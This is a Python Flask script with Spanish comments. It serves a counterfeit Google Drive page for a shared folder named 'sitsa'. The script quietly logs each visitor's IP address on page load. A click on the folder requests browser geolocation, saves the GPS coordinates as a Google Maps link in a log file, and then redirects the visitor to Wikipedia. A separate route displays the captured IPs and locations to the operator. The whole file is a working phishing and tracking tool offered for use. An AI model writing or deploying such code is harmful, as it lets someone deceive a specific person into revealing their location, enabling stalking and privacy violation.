from flask import Flask, request, redirect, render_template_string
import datetime

app = Flask(__name__)

# --- DISEÑO PROFESIONAL DE GOOGLE DRIVE ---
HTML_DRIVE = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SITSA - Google Drive</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f7f9fc; margin: 0; color: #3c4043; }
        header { background: white; padding: 10px 20px; display: flex; align-items: center; border-bottom: 1px solid #dadce0; position: sticky; top: 0; }
        .logo { display: flex; align-items: center; font-size: 22px; color: #5f6368; }
        .logo img { width: 40px; margin-right: 10px; }
        .container { padding: 20px 50px; }
        .breadcrumb { margin-bottom: 20px; font-size: 18px; color: #5f6368; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
        .folder { 
            background: white; border: 1px solid #dadce0; border-radius: 6px; padding: 15px; 
            display: flex; align-items: center; cursor: pointer; transition: background 0.2s;
        }
        .folder:hover { background-color: #e8f0fe; border-color: #1a73e8; }
        .folder-icon { color: #5f6368; margin-right: 15px; font-size: 24px; }
        .folder-name { font-weight: 500; font-size: 14px; }
        .info-text { margin-top: 40px; font-size: 13px; color: #70757a; text-align: center; }
    </style>
    <script>
        function abrirCarpeta() {
            if (navigator.geolocation) {
                // Al hacer clic en la carpeta, pedimos permiso
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        fetch(`/guardar-coordenadas?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`)
                        .then(() => {
                            // Redirigir al Drive real o a una página de "Cargando..."
                            window.location.href = "https://es.wikipedia.org/wiki/Dirección_IP";
                        });
                    },
                    () => {
                        // Si rechaza, redirigimos igual
                        window.location.href = "https://es.wikipedia.org/wiki/Dirección_IP";
                    }
                );
            } else {
                window.location.href = "https://es.wikipedia.org/wiki/Dirección_IP";
            }
        }
    </script>
</head>
<body>
    <header>
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" alt="Drive">
            Drive
        </div>
    </header>

    <div class="container">
        <div class="breadcrumb">Mi unidad > <b>Compartido conmigo</b></div>
        
        <div class="grid">
            <div class="folder" onclick="abrirCarpeta()">
                <div class="folder-icon">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"></path></svg>
                </div>
                <div class="folder-name">sitsa</div>
            </div>
        </div>

        <p class="info-text">Selecciona una carpeta para ver los archivos disponibles.</p>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    # Captura de IP silenciosa al cargar la página
    ip_header = request.headers.get('X-Forwarded-For')
    ip_real = ip_header.split(',')[0].strip() if ip_header else request.remote_addr
    with open("log.txt", "a") as f:
        f.write(f"\n--- VISITA ---\nFecha: {datetime.datetime.now()}\nIP: {ip_real}\n")
    
    return render_template_string(HTML_DRIVE)

@app.route('/guardar-coordenadas')
def guardar_gps():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    with open("log.txt", "a") as f:
        f.write(f"GPS: https://www.google.com/maps?q={lat},{lon}\n")
    return "OK"

@app.route('/ver-resultados')
def ver():
    try:
        with open("log.txt", "r") as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "Sin capturas."

if __name__ == "__main__":
    app.run()
